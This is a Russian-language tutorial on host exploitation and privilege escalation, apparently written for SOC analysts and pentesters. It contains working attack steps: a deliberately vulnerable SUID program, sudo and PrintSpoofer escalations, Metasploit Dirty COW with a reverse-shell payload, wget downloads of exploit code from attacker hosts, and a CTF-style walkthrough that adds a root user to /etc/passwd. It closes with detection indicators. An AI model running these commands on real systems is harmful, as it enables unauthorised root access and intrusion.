# Эксплуатация уязвимостей на хосте и эскалация привилегий

## 1. Фундаментальные понятия: уязвимости, эксплуатация и привилегии

**Уязвимость программного обеспечения** — это дефект реализации или архитектуры, позволяющий нарушить политику безопасности системы: получить несанкционированный доступ, повысить привилегии, скомпрометировать данные или вызвать отказ в обслуживании. **Эксплуатация** — процесс практического использования уязвимости для достижения конкретной цели атакующего. В контексте атак на конечные точки центральными являются два класса операций: удалённая эксплуатация, дающая первоначальное исполнение кода (Remote Code Execution, RCE), и локальная эксплуатация, чаще всего нацеленная на **эскалацию привилегий** (Local Privilege Escalation, LPE).

Эскалация привилегий подразделяется на **вертикальную** (повышение уровня прав с непривилегированной учётной записи до администратора/root) и **горизонтальную** (доступ к объектам другого пользователя с тем же уровнем прав, например, чтение чужих файлов). В реальных атаках два этапа, как правило, комбинируются: эксплойт RCE (например, через веб-приложение) даёт ограниченный шелл, после чего следует LPE для получения полного контроля над хостом.

Характерная путаница возникает между понятиями «удалённая эксплуатация» и «удалённая эскалация привилегий». Удалённая эксплуатация почти всегда подразумевает RCE; выполнение кода может происходить с привилегиями скомпрометированного сервиса (часто — LocalSystem в Windows или root в Linux), т.е. эскалация в этом случае не требуется. Локальная же эскалация привилегий выполняется внутри уже захваченного окружения и не требует сетевого взаимодействия с уязвимой службой. Другая частая ошибка — отождествление эскалации привилегий исключительно с уязвимостями ядра. На практике огромное число векторов LPE связано с эксплуатацией некорректных конфигураций, слабых разрешений, race condition в пользовательском пространстве и особенностей легитимных механизмов (sudo, токены Windows, запланированные задания).

Ниже представлена сравнительная таблица, разграничивающая базовые категории атак на конечные точки по их роли в цепочке компрометации.

| Тип атаки                     | Характер эксплуатации                | Результат                                                     | Типичные примеры                        |
|-------------------------------|--------------------------------------|---------------------------------------------------------------|----------------------------------------|
| Удалённое выполнение кода (RCE) | Эксплуатируется уязвимость сетевой службы, клиентского ПО или веб-приложения. Взаимодействие происходит по сети. | Запуск произвольного кода с привилегиями скомпрометированного процесса (часто SYSTEM/root). | EternalBlue (MS17-010), Log4Shell (CVE-2021-44228) |
| Локальное повышение привилегий (LPE) | Атакующий уже имеет ограниченный доступ к системе (обычно локальная или интерактивная сессия) и эксплуатирует уязвимость в ядре, системной службе или конфигурации. | Повышение привилегий до административного или системного уровня. | Dirty COW (CVE-2016-5195), PrintSpoofer (Windows Named Pipe Impersonation) |
| Горизонтальная эскалация (HPE) | Злоумышленник, обладая учётной записью одного пользователя, получает доступ к данным или процессам другого пользователя с тем же уровнем привилегий. | Доступ к конфиденциальной информации, захват сессии, повышение устойчивости. | Уязвимости в многопользовательских приложениях, слабые ACL на объектах ядра. |
| Обход аутентификации | Эксплуатация логических ошибок для доступа к функционалу без валидных учётных данных. | Анонимный доступ к защищённым интерфейсам, обход парольной защиты. | Уязвимость в Apache Struts (CVE-2024-53677) — обход ограничений загрузки. |
| Отказ в обслуживании (DoS) | Исчерпание ресурсов или вызов аварийного завершения службы. | Нарушение доступности, но не прямой захват привилегий. Используется редко в цепочках эскалации. | медленное чтение HTTP/2 (CVE-2023-44487). |

Для полноты понимания рассмотрим простейший пример эксплуатации **локальной уязвимости переполнения буфера в SUID-программе** — классического вектора вертикальной эскалации привилегий в UNIX-подобных системах. Предположим, что в системе присутствует программа с установленным битом SUID root, содержащая уязвимый вызов `gets()`. Скомпилируем её с отключёнными защитами (иллюстративная среда, современные дистрибутивы включают ASLR, стековые канарейки и NX).

```c
// vulnerable.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void secret_function() {
    setuid(0);
    system("/bin/sh");
}

int main() {
    char buffer[64];
    printf("Enter input: ");
    gets(buffer);   // уязвимость
    printf("You entered: %s\n", buffer);
    return 0;
}
```

Компиляция и установка SUID бита (демонстрация на учебном стенде):
```bash
gcc -fno-stack-protector -z execstack -no-pie -o vuln vulnerable.c
sudo chown root:root vuln
sudo chmod 4755 vuln
```

Атакующий, имея локальный доступ, может перезаписать адрес возврата и передать управление на `secret_function`, которая породит привилегированный шелл. Определение точного смещения до сохранённого `EIP/RIP` и построение payload — предмет анализа бинарной эксплуатации. При включённых защитах подобная атака требует обхода ASLR/канареек, но сам принцип иллюстрирует суть эксплуатации: использование дефекта программы для выполнения кода с повышенными привилегиями.

Таким образом, атаки на конечные точки строятся вокруг двух взаимосвязанных этапов — получения исполнения и повышения прав. Следующий раздел детализирует внутренние механизмы, лежащие в основе этих процессов.

## 2. Внутренние механизмы эксплуатации и векторы эскалации привилегий

Эффективная эксплуатация уязвимостей и эскалация привилегий опираются на глубокое понимание архитектуры операционной системы, модель безопасности и конкретные классы дефектов. Данный раздел классифицирует уязвимости, наиболее часто используемые для LPE, описывает методы их обнаружения и эксплуатации, а также систематизирует типичные векторы повышения привилегий в Windows и Linux.

### 2.1 Классы эксплуатируемых уязвимостей

| Класс уязвимости               | Условия возникновения                                         | Типичный индикатор                                             | Метод эксплуатации (LPE)                                      |
|--------------------------------|---------------------------------------------------------------|----------------------------------------------------------------|---------------------------------------------------------------|
| Переполнение буфера (стек)     | Отсутствие проверки длины входных данных при копировании в фиксированный массив на стеке. | Аварийное завершение с SIGSEGV при обработке длинного ввода.  | Перезапись адреса возврата для передачи управления на shellcode. В ядре — перехват указателя на функцию. |
| Use-after-free (UAF)           | Обращение к освобождённой памяти из-за некорректного управления временем жизни объекта. | Крахи с SIGSEGV или повреждение данных при манипуляциях с объектами. | Перезапись освобождённой области контролируемыми данными, подмена виртуальной таблицы (vtable) для вызова нужной функции. |
| Race condition (TOCTOU)        | Разрыв между проверкой условия безопасности и использованием ресурса, позволяющий изменить состояние в промежутке. | Недетерминированное поведение при параллельных операциях с файлами, сокетами. | Множественные попытки с высокой частотой, использование символических ссылок для подмены файла. |
| Ошибки контроля доступа (DACL) | Некорректные разрешения на объектах ядра, реестре, файловой системе, позволяющие непривилегированному пользователю изменять критичные настройки. | Массовое обнаружение записей WRITE_DAC, GenericWrite для пользовательских групп в результатах BloodHound. | Модифицикация бинарного пути службы, подмена DLL, изменение параметров реестра. |
| Уязвимости в механизмах аутентификации/авторизации | Логические ошибки в реализации sudo, Polkit, Windows токенов. | Возможность выполнить команду с более высокими привилегиями без правильной верификации. | Эксплуатация конкретной версии (например, CVE-2021-3156 — heap overflow в sudo, CVE-2021-4034 — PwnKit). |
| Неправильная обработка дескрипторов/токенов | Утечки дескрипторов процессов или токенов с правами SYSTEM, доступные низкопривилегированным процессам. | Обнаружение унаследованных/дуплицированных дескрипторов с высокими правами через Process Explorer или PoC-скрипты. | Захват токена, дюпликация дескриптора для внедрения в привилегированный процесс. |

Особняком стоят конфигурационные уязвимости, не связанные с ошибками кода, но широко используемые для эскалации: слабые разрешения на исполняемые файлы/скрипты, запись в PATH, отсутствие подписи бинарников, неуправляемые учётные данные в открытом виде. Они, как правило, выявляются автоматизированными сканерами и не требуют написания эксплойтов, но дают столь же надёжный результат.

### 2.2 Типовые векторы эскалации привилегий в ОС Windows и Linux

Ниже представлена сводная таблица ключевых векторов горизонтальной и вертикальной эскалации, актуальных для конечных точек под управлением обеих операционных систем. Для каждого вектора указан характерный инструмент перечисления.

| Категория                          | Windows                                                                 | Linux                                                                   | Инструмент перечисления          |
|------------------------------------|-------------------------------------------------------------------------|-------------------------------------------------------------------------|----------------------------------|
| **Уязвимости ядра**                | Уязвимости win32k.sys, ntoskrnl.exe (напр., EternalBlue kernel exploit) | Dirty COW, Stack Clash, OverlayFS (CVE-2021-3493)                       | Watson, Windows Exploit Suggester, Linux Exploit Suggester 2 |
| **Сервисы/демоны**                 | Уязвимые драйверы, неправильно настроенные сервисы (Unquoted Service Path, слабые разрешения на бинарники) | Уязвимые версии sudo, Polkit, DBus, setuid-бинарники                    | WinPEAS, PowerUp.ps1, linPEAS   |
| **Конфигурация**                   | AlwaysInstallElevated, пароли в группах политики, слабые разрешения на реестр, планировщик заданий | Файлы ~/.bash_history, небезопасные записи в /etc/crontab, права на /etc/passwd | Seatbelt, SharpUp, LinPEAS, LinEnum |
| **Межпроцессное взаимодействие и токены** | SeImpersonatePrivilege, SeAssignPrimaryToken, Named Pipes (Potato-атаки), PrintSpoofer | Отсутствует прямой аналог; горизонтальная эскалация через ptrace, X11-сессии | PrintSpoofer, JuicyPotato, RoguePotato, pspy  |
| **Слабые пароли / повторное использование** | Pass-the-Hash, Kerberoasting, извлечение из LSASS | Слабые хеши в /etc/shadow, повторное использование паролей у пользователей с sudo | Mimikatz, Impacket, John the Ripper |

Для иллюстрации механизма эскалации, эксплуатирующего **неправильную конфигурацию sudo**, рассмотрен частый сценарий: непривилегированный пользователь может выполнять определённые команды с правами root без пароля, и одна из них позволяет произвольное исполнение. Например, запись в sudoers:

```text
user ALL=(ALL) NOPASSWD: /usr/bin/find
```

Команда `find` поддерживает опцию `-exec`, что делает её эквивалентной выполнению любых команд с root-правами:

```bash
sudo find /home -name "*.txt" -exec /bin/sh \;
# uid=0(root) gid=0(root) groups=0(root)
```

Данный вектор не эксплуатирует уязвимость ядра, а использует легитимную функциональность, предоставленную администратором по ошибке. Это подчёркивает необходимость аудита разрешений sudo как критического элемента предотвращения эскалации привилегий.

Процесс эскалации можно представить в виде типовой последовательности действий, выполняемых аналитиком SOC или пентестером:

```text
[Ограниченный пользователь / сессия]
        │
        ▼
[Сбор информации о системе и привилегиях]
        │ (автоматизированные скрипты WinPEAS/LinPEAS, ручные проверки whoami /priv)
        ▼
[Анализ векторов: уязвимые ядра, конфигурации, разрешения, патчи]
        │
        ▼
[Выбор и подготовка эксплойта / payload]
        │
        ▼
[Эксплуатация] ──► [Подтверждение привилегий (whoami, id)]
        │
        ▼
[Закрепление и дальнейшая латеральная подвижка]
```

Классификация и последовательное перечисление векторов позволяют системно подходить как к атакующим техникам, так и к построению детектов. Следующий раздел переводит эти теоретические основы в практическую плоскость, рассматривая конкретные инструменты и рабочие процедуры.

## 3. Применение: инструментарий и процедуры эксплуатации и эскалации

Ежедневная работа специалиста по кибербезопасности (аналитика SOC, инженера по расследованию инцидентов, пентестера) требует владения практическими методами поиска и эксплуатации уязвимостей для эскалации привилегий. В этом разделе описываются ключевые инструменты, типовые цепочки команд и процедуры, с которыми приходится взаимодействовать как при тестировании на проникновение, так и при анализе действий злоумышленника.

### 3.1 Автоматизированный сбор векторов эскалации

Первым шагом после получения ограниченного доступа является всестороннее перечисление конфигурации хоста. Основные скрипты:

- **LinPEAS** (часть PEASS-ng) — для Linux. Запускается как `./linpeas.sh -a` и выводит огромный отчёт, подсвечивающий потенциальные векторы: SUID-файлы, capabilities, cron-задачи, доступные записи в /etc/passwd и /etc/shadow, уязвимые версии sudo/Polkit, активные процессы и т.д.
- **WinPEAS** (PEASS-ng) — аналог для Windows. Выявляет неправильные разрешения на службы, привилегии (SeImpersonate, SeBackup), AlwaysInstallElevated, сохранённые пароли и многое другое.
- **PowerUp.ps1** — PowerShell-скрипт из состава PowerSploit, фокусируется на распространённых конфигурационных проблемах Windows: некорректные права на файлы служб, возможность подмены DLL, злоупотребление функциями реестра.
- **Seatbelt** — C#-инструмент для безопасного сбора конфигурационных данных системы Windows, часто используемый в red team операциях.

Типовая команда для Linux и фрагмент ожидаемого вывода (иллюстративная схема):

```bash
user@compromised:~$ ./linpeas.sh -a
...
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 12345 /usr/bin/python3.8
-rwsr-xr-x 1 root root 84864 /usr/bin/find
...
╔══════════╣ Analyzing Sudoers Files
User user may run the following commands on host:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/awk
...
```

Выделенные строки явно указывают на возможность эскалации через SUID-бинарники (Python с возможностью выполнения команд через `-c`) или небезопасную конфигурацию sudo.

Для Windows проверим привилегии токена с помощью PowerUp:

```powershell
PS C:\> Import-Module .\PowerUp.ps1
PS C:\> Get-ModifiableServiceFile
ServiceName    : VulnSvc
Path           : C:\Program Files\VulnApp\service.exe
ModifiableFile : C:\Program Files\VulnApp\service.exe
IdentityRef    : BUILTIN\Users
Permissions    : {WriteOwner, Delete, WriteAttributes, Synchronize...}
...
```

Если пользователь имеет права на изменение исполняемого файла службы, работающей с правами SYSTEM, он может перезаписать бинарник и перезапустить службу (или дождаться её перезапуска). Это — один из наиболее надёжных методов эскалации привилегий в Windows.

### 3.2 Поиск и применение эксплойтов

Когда конфигурационные векторы отсутствуют, переходят к эксплуатации публичных уязвимостей. Поиск осуществляется:

- **SearchSploit** — локальная копия Exploit-DB. Например, для поиска эксплойтов под конкретное ядро Linux:
  ```bash
  searchsploit linux kernel 3.13 --exclude="dos" -t
  ```
  Вывод может содержать Dirty COW (CVE-2016-5195), который подходит для ядер 2.6.22–3.13.
- **Metasploit Framework**: модуль `post/multi/recon/local_exploit_suggester` выполняет автоматическую проверку хоста и предлагает подходящие эксплойты.
- **Windows Exploit Suggester (Watson)**, **Linux Exploit Suggester 2**, **Kernelpop** — автономные скрипты на Python/Bash, анализирующие версии ядра и патчи.

Пример использования Metasploit после получения meterpreter-сессии:

```bash
msf6> use post/multi/recon/local_exploit_suggester
msf6> set SESSION 1
msf6> run

[*] 127.0.0.1 - Collecting local exploits for x64/linux...
[*] 127.0.0.1 - 167 exploit checks are being tried...
[+] 127.0.0.1 - exploit/linux/local/cve_2016_5195_dirtycow: The target appears to be vulnerable.
```

После идентификации уязвимости эксплуатация выполняется соответствующим модулем:

```bash
msf6> use exploit/linux/local/cve_2016_5195_dirtycow
msf6> set SESSION 1
msf6> set payload linux/x64/meterpreter/reverse_tcp
msf6> set LHOST eth0
msf6> run
...
meterpreter > getuid
Server username: root
```

Для ситуаций, когда Metasploit недоступен, эксплойты компилируются на целевой машине. Ниже приведён пример для локальной эскалации через CVE-2021-3156 (sudoedit heap overflow) на Linux. Сначала загружаем PoC, затем собираем и запускаем:

```bash
$ wget -q http://attacker.local/sudo_exploit.c
$ gcc -o sudo_exploit sudo_exploit.c
$ ./sudo_exploit
# id
uid=0(root) gid=0(root) groups=0(root)
```

В Windows классическим примером является использование **PrintSpoofer** (или его предшественников семейства Potato) для эксплуатации привилегии `SeImpersonatePrivilege`, которая по умолчанию присутствует у учётных записей IIS, Network Service и локальных сервисов. Инструмент заставляет SYSTEM-процесс аутентифицироваться на контролируемый злоумышленником Named Pipe, захватывает токен и исполняет произвольный код.

```powershell
PS C:\> .\PrintSpoofer64.exe -i -c "powershell.exe -ep bypass"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser OK
PS C:\Windows\system32> whoami
nt authority\system
```

### 3.3 Типичные ошибки и подводные камни

- **Отсутствие интернет-подключения на цели:** эксплойты, загрузчики и компиляторы требуют переноса инструментов через промежуточные хосты. Следует заранее подготовить автономные версии скриптов в кодировке base64.
- **Антивирусные средства и EDR:** современные защитные решения детектируют публичные эксплойты и известные инструменты (Mimikatz, PowerUp). Боевое применение требует модификации и обфускации. При анализе инцидентов аналитик SOC должен искать артефакты, характерные для таких зашумлённых, но всё ещё используемых инструментов.
- **Повреждение системы:** некорректная эксплуатация ядерных уязвимостей может привести к панике ядра и перезагрузке, что лишит злоумышленника доступа. Консервативный подход предполагает сначала проверку уязвимости без эксплуатации (только детект).
- **Ложные срабатывания suggester’ов:** высокая версия ядра не гарантирует отсутствие бэкпортированных патчей. В Linux нужно проверять changelog пакета, а в Windows — установленные KB.

Таким образом, практическая работа с эскалацией привилегий требует не только знания инструментов, но и понимания ограничений среды, а также способности быстро адаптироваться. Дальнейший материал закрепляет эти навыки на сквозном практическом примере.

## 4. Сквозной практический пример: от ограниченного shell к root через Dirty COW

Представленный пример демонстрирует полный цикл эксплуатации уязвимости ядра Linux для эскалации привилегий с низкопривилегированной учётной записи `www-data` до суперпользователя. Сценарий типичен для учебных лабораторий SOC L1 и CTF-полигонов.

### Исходные условия
- **Система:** Ubuntu 14.04.6 LTS, ядро 3.13.0-32-generic.
- **Первоначальный доступ:** атакующий эксплуатировал уязвимость в веб-приложении и получил обратную оболочку с правами `www-data`.
- **Ограничения:** пользователь `www-data` не имеет sudo-прав, домашней директории и не состоит в привилегированных группах.
- **Цель:** получить root-доступ для чтения флага `/root/flag.txt` и дальнейшего закрепления.

### Шаг 1: Разведка и подтверждение уязвимости

Первым делом собираем информацию о ядре и архитектуре:

```bash
$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
$ cat /proc/version
Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu ...
```

Версия ядра подпадает под уязвимость CVE-2016-5195 (Dirty COW). Проверяем наличие компилятора:

```bash
$ which gcc
/usr/bin/gcc
```

GCC доступен — можно компилировать на месте.

### Шаг 2: Загрузка и сборка эксплойта

Загружаем публичный PoC (упрощённая версия, записывающая произвольные данные в `/etc/passwd` через гонку в механизме copy-on-write) с контролируемого сервера:

```bash
$ wget -O /tmp/dirty.c http://10.10.14.2:8080/dirtycow-filetostring.c
$ cd /tmp
$ gcc -pthread dirty.c -o dirty -lcrypt
$ file dirty
dirty: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked ...
```

Сборка прошла успешно, исполняемый файл создан.

### Шаг 3: Эксплуатация — создание привилегированного пользователя

Запускаем эксплойт, указав желаемые данные для записи в файлы. В данном PoC мы добавляем нового пользователя с UID=0 в `/etc/passwd` (слепок реальной процедуры зависит от конкретной версии эксплойта; здесь представлена иллюстративная схема):

```bash
$ echo 'firefart:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash' > /tmp/payload
$ ./dirty /etc/passwd /tmp/payload
```

Эксплойт в цикле пытается скопировать содержимое `/tmp/payload` в файл `/etc/passwd` с использованием гонки COW. После нескольких итераций (обычно около минуты) на экране появляется надпись об успешной модификации.

Проверяем результат:

```bash
$ tail -n 1 /etc/passwd
firefart:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash
```

Новый пользователь с UID=0 добавлен.

### Шаг 4: Получение root-шелла

Переключаемся на созданного пользователя, используя установленный в эксплойте пароль (по умолчанию 'firefart'):

```bash
$ su firefart
Password: firefart
# id
uid=0(firefart) gid=0(root) groups=0(root)
# cat /root/flag.txt
flag{D1rty_C0W_G07_M3_r00T}
```

Привилегии успешно повышены.

### Ожидаемый вывод и значение для аналитика SOC

Данный пример показывает, как локальная уязвимость ядра позволяет выполнить вертикальную эскалацию привилегий с изначально бесправного веб-сервера до полного контроля над системой. С точки зрения мониторинга и реагирования, аналитик SOC должен обращать внимание на следующие индикаторы:
- Необычные вызовы `ptrace` или подозрительные модификации системных файлов (`/etc/passwd`) процессом `www-data` или аналогом.
- Сетевые соединения к нехарактерным портам для загрузки внешнего кода (wget на нестандартный порт).
- Компиляция исполняемых файлов на сервере приложений (запуск `gcc`, аномальные временные файлы в `/tmp`).
- Появление нового пользователя с UID=0 в /etc/passwd — тривиальный сигнал, но часто игнорируемый в отсутствие регулярного аудита.

Соответствующие правила корреляции в SIEM могут включать:
- DeviceProcessEvents (gcc, wget) + FileModification (/etc/passwd) от одного пользователя за короткий интервал.
- Sysmon event ID 11 (FileCreate) в каталогах `/tmp`, `/var/tmp` с исполняемыми расширениями для веб-процессов (для гетерогенных сред).
- Применение сигнатурного детекта на известные названия эксплойтов (например, 'dirtycow', 'dirty.c').

Комбинация понимания механизма атаки и оснащённости инструментами детекта позволяет эффективно выявлять подобные инциденты на стадии эскалации.
